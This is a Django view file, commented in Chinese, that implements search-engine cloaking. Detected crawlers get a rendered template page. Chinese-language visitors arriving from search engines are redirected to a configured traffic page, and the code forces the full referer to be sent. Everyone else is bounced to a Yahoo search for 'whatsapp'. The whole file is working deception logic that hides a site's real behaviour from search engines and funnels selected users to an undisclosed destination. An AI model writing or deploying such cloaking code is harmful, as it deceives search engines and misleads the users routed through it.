import json
import logging
from pathlib import Path

from django.conf import settings
from django.http import HttpResponseRedirect, HttpResponse
from django.shortcuts import render
from django.views.decorators.http import require_GET

from XingXingWeb.utils import cloak_detect
from XingXingWeb.utils import request_info

logger = logging.getLogger(__name__)

main_domain = settings.MAIN_DOMAIN

cloak_detector = cloak_detect.CloakDetector()

# 读取模板配置文件
_template_config_path = Path(__file__).resolve().parent.parent.parent / "template_config.json"
try:
    with open(_template_config_path, "r", encoding="utf-8") as f:
        _template_config = json.load(f)
except (FileNotFoundError, json.JSONDecodeError) as e:
    logger.warning("无法加载 template_config.json: %s，将使用默认配置", e)
    _template_config = {}


def _get_template_name(subdomain: str) -> str:
    """
    根据二级域名从配置中获取对应的模板文件名。

    查找顺序:
    1. 子域名精确匹配 key
    2. "default" key
    3. 回退到 "index1.html"
    """
    if subdomain in _template_config:
        return _template_config[subdomain]
    if "default" in _template_config:
        return _template_config["default"]
    return "index1.html"


def _accept_language_is_chinese(request) -> bool:
    """
    判断请求的 Accept-Language 是否包含中文。

    匹配 ``zh``、``zh-CN``、``zh-TW``、``zh-HK``、``zh-SG`` 等。
    未携带该头部时返回 ``False``。
    """
    accept_language = request.META.get("HTTP_ACCEPT_LANGUAGE", "")
    if not accept_language:
        return False
    # 取逗号分隔的第一个语言标签（主要优先级最高）
    primary_lang = accept_language.split(",")[0].strip().split(";")[0].strip().lower()
    return primary_lang.startswith("zh")


def _redirect_to_yahoo() -> HttpResponseRedirect:
    """构造 302 重定向至雅虎搜索的响应，并携带 Referrer-Policy 头。"""
    yahoo_url = "https://search.yahoo.com/search?p=whatsapp"
    response = HttpResponseRedirect(yahoo_url, status=302)
    response["Referrer-Policy"] = "origin-when-cross-origin"
    return response


def _redirect_to_ga(request) -> HttpResponseRedirect:
    """
    302 跳转到流量分析页（GA_DOMAIN_NAME），并通过 Referer 头携带来源。

    实现方式：
        1. 读取当前请求的 Referer。
        2. 若为空（说明不是从搜索引擎等外部页面点进来），回退到雅虎重定向。
        3. 构造 302 响应，并设置 ``Referrer-Policy: unsafe-url``，
           强制浏览器在跨站跳转时仍把完整 Referer 写入目标请求头。

    注意：
        Referer 由浏览器在收到 302 响应后自动写入下一个请求，因此
        ``Referrer-Policy: unsafe-url`` 是必须项，否则 Chrome/Edge 等
        浏览器默认会发送空 Referer。
    """
    referer = request.META.get("HTTP_REFERER", "").strip()
    if not referer:
        logger.info("Referer 为空，搜索引擎真人请求回退到雅虎搜索重定向")
        return _redirect_to_yahoo()

    ga_url = (settings.GA_DOMAIN_NAME or "").rstrip("/") + "/"
    if not ga_url or ga_url == "/":
        logger.warning("GA_DOMAIN_NAME 未配置，回退到雅虎搜索重定向")
        return _redirect_to_yahoo()

    logger.info("搜索引擎真人请求(中文)，302 跳转至流量分析页，referer=%s", referer)
    response = HttpResponseRedirect(ga_url, status=302)
    # unsafe-url：跨站跳转时仍发送完整 Referer，确保 GA 域名能收到来源
    response["Referrer-Policy"] = "unsafe-url"
    return response


@require_GET
def index(request):
    # ---- 1. 获取二级域名前缀 ----
    subdomain = request_info.get_subdomain_prefix(request, main_domain)
    logger.info("请求二级域名前缀: %r", subdomain)

    # ---- 2. 斗篷开关检测 ----
    if not settings.CLOAK_ENABLED:
        template_name = _get_template_name(subdomain)
        logger.info("斗篷已关闭，直接渲染模板: %s (subdomain=%r)", template_name, subdomain)
        response = render(request, template_name)
        response._rendered_template = template_name
        return response

    # ---- 3. 识别是否来自搜索引擎蜘蛛 ----
    result = cloak_detector.detect_from_environ(request.META)
    logger.info(
        "蜘蛛检测结果: is_spider=%s, is_from_search_engine=%s, "
        "matched_spider=%s, matched_engine=%s",
        result.is_spider,
        result.is_from_search_engine,
        result.matched_spider,
        result.matched_engine,
    )

    # ---- 4. 根据检测结果分流 ----
    template_name = _get_template_name(subdomain)

    # 4a. 爬虫请求 → 直接渲染模板
    if result.is_spider:
        logger.info("爬虫请求，渲染模板: %s (subdomain=%r)", template_name, subdomain)
        response = render(request, template_name)
        response._rendered_template = template_name
        return response

    # 4b. 来自搜索引擎的真人请求 → 仅中文语言跳转到流量分析页（带 Referer），否则重定向
    if result.is_from_search_engine:
        if _accept_language_is_chinese(request):
            return _redirect_to_ga(request)
        else:
            logger.info("搜索引擎真人请求(非中文)，302 重定向至雅虎搜索")
            return _redirect_to_yahoo()

    # 4c. 其余所有请求 → 重定向
    logger.info("普通请求，302 重定向至雅虎搜索")
    return _redirect_to_yahoo()
